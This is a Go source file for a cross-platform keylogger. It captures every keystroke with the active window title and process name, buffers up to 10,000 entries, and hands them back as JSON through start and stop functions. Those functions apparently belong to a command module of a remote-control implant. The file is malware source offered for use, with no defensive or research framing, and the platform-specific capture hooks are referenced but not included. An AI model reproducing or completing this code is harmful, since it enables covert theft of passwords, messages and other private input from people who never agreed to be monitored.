// keylogger.go - Cross-platform keylogger with window title tracking
package main

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"
)

// KeylogEntry represents a single keylog entry with context
type KeylogEntry struct {
	Timestamp   time.Time `json:"timestamp"`
	Key         string    `json:"key"`
	WindowTitle string    `json:"window_title"`
	ProcessName string    `json:"process_name"`
}

// Keylogger manages the keylogging session
type Keylogger struct {
	entries     []KeylogEntry
	mu          sync.Mutex
	running     bool
	stopChan    chan bool
	currentWindow string
	currentProcess string
}

var (
	globalKeylogger *Keylogger
	keyloggerMu     sync.Mutex
)

// StartKeylogger starts the keylogger in the background
func StartKeylogger() (string, error) {
	keyloggerMu.Lock()
	defer keyloggerMu.Unlock()

	if globalKeylogger != nil && globalKeylogger.running {
		return "Keylogger is already running", nil
	}

	globalKeylogger = &Keylogger{
		entries:  make([]KeylogEntry, 0),
		running:  true,
		stopChan: make(chan bool),
	}

	// Start keylogger in background
	go globalKeylogger.run()

	return fmt.Sprintf("Keylogger started successfully at %s", time.Now().Format(time.RFC3339)), nil
}

// StopKeylogger stops the keylogger and returns captured data
func StopKeylogger() (string, error) {
	keyloggerMu.Lock()
	defer keyloggerMu.Unlock()

	if globalKeylogger == nil || !globalKeylogger.running {
		return "Keylogger is not running", nil
	}

	// Stop the keylogger
	globalKeylogger.running = false
	close(globalKeylogger.stopChan)
	
	// Give it a moment to clean up
	time.Sleep(100 * time.Millisecond)

	// Prepare results
	globalKeylogger.mu.Lock()
	entries := globalKeylogger.entries
	entryCount := len(entries)
	globalKeylogger.mu.Unlock()

	if entryCount == 0 {
		globalKeylogger = nil
		return "Keylogger stopped. No keys were captured.", nil
	}

	// Format results
	result := map[string]interface{}{
		"entries":     entries,
		"total_keys":  entryCount,
		"stop_time":   time.Now(),
	}

	// Also create a readable summary
	summary := map[string]int{}
	for _, entry := range entries {
		key := fmt.Sprintf("%s (%s)", entry.WindowTitle, entry.ProcessName)
		summary[key]++
	}
	result["window_summary"] = summary

	jsonData, err := json.MarshalIndent(result, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal keylog data: %v", err)
	}

	globalKeylogger = nil
	return string(jsonData), nil
}

// run is the main keylogger loop
func (k *Keylogger) run() {
	logDebug("Keylogger thread started")
	
	err := k.startPlatformKeylogger()
	if err != nil {
		logDebug(fmt.Sprintf("Keylogger error: %v", err))
		k.running = false
	}
}

// addEntry adds a keylog entry (thread-safe)
func (k *Keylogger) addEntry(key string) {
	k.mu.Lock()
	defer k.mu.Unlock()

	// Get current window info
	windowTitle, processName := k.getCurrentWindowInfo()

	entry := KeylogEntry{
		Timestamp:   time.Now(),
		Key:         key,
		WindowTitle: windowTitle,
		ProcessName: processName,
	}

	k.entries = append(k.entries, entry)
	
	// Limit entries to prevent memory issues (keep last 10000 entries)
	if len(k.entries) > 10000 {
		k.entries = k.entries[len(k.entries)-10000:]
	}
}

// getCurrentWindowInfo gets the current active window title and process name
func (k *Keylogger) getCurrentWindowInfo() (string, string) {
	// This will be implemented in platform-specific files
	title, process := getActiveWindowInfo()
	
	// Cache the values
	if title != "" {
		k.currentWindow = title
		k.currentProcess = process
	}
	
	return k.currentWindow, k.currentProcess
}

// ConvertKeyToString converts key code to readable string
func ConvertKeyToString(keyCode int, shift bool) string {
	// Handle special keys
	specialKeys := map[int]string{
		8:   "[BACKSPACE]",
		9:   "[TAB]",
		13:  "[ENTER]",
		27:  "[ESC]",
		32:  " ",
		33:  "[PAGEUP]",
		34:  "[PAGEDOWN]",
		35:  "[END]",
		36:  "[HOME]",
		37:  "[LEFT]",
		38:  "[UP]",
		39:  "[RIGHT]",
		40:  "[DOWN]",
		45:  "[INSERT]",
		46:  "[DELETE]",
		112: "[F1]",
		113: "[F2]",
		114: "[F3]",
		115: "[F4]",
		116: "[F5]",
		117: "[F6]",
		118: "[F7]",
		119: "[F8]",
		120: "[F9]",
		121: "[F10]",
		122: "[F11]",
		123: "[F12]",
	}

	if special, ok := specialKeys[keyCode]; ok {
		return special
	}

	// Handle alphanumeric keys
	if keyCode >= 65 && keyCode <= 90 { // A-Z
		if shift {
			return string(rune(keyCode))
		}
		return string(rune(keyCode + 32))
	}

	if keyCode >= 48 && keyCode <= 57 { // 0-9
		if shift {
			shiftNumbers := ")!@#$%^&*("
			return string(shiftNumbers[keyCode-48])
		}
		return string(rune(keyCode))
	}

	// Handle numpad
	if keyCode >= 96 && keyCode <= 105 {
		return string(rune(keyCode - 48))
	}

	return fmt.Sprintf("[KEY_%d]", keyCode)
}
